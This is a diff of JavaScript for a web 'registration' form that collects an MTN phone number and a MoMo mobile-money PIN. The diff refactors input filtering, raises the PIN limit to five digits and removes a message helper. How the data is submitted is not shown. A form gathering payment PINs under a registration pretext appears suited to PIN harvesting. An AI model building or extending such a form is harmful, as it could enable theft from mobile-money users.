@@ -1,25 +1,25 @@
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.getElementById('registrationForm');
-    const messageContainer = document.getElementById('messageContainer');
     const submitBtn = document.getElementById('submitBtn');
     const mtnInput = document.getElementById('mtnNumber');
     const pinInput = document.getElementById('momoPin');
 
-    // Input sanitization
-    mtnInput.addEventListener('input', () => {
-        mtnInput.value = mtnInput.value.replace(/[^\d\s\+]/g, '');
+    // Allow only digits and spaces/+ for MTN number
+    mtnInput.addEventListener('input', function() {
+        this.value = this.value.replace(/[^\d\s\+]/g, '');
     });
 
-    pinInput.addEventListener('input', () => {
-        pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 4);
+    // Allow only digits for PIN (max 5)
+    pinInput.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').slice(0, 5);
     });
 
+    // Form submission
     form.addEventListener('submit', async function(e) {
         e.preventDefault();
         
         submitBtn.disabled = true;
         submitBtn.textContent = 'REGISTERING...';
-        hideMessage();
 
         const formData = new FormData(form);
 
@@ -46,18 +46,15 @@ document.addEventListener('DOMContentLoaded', function() {
     });
 });
 
-function showMessage(msg, type) {
+// Show message
+function showMessage(message, type) {
     const container = document.getElementById('messageContainer');
-    container.textContent = msg;
+    container.textContent = message;
     container.className = `message-container ${type}`;
     container.style.display = 'block';
 }
 
-function hideMessage() {
-    const container = document.getElementById('messageContainer');
-    container.style.display = 'none';
-}
-
+// Toggle PIN visibility
 function togglePinVisibility() {
     const pin = document.getElementById('momoPin');
     const toggle = document.querySelector('.toggle-pin');
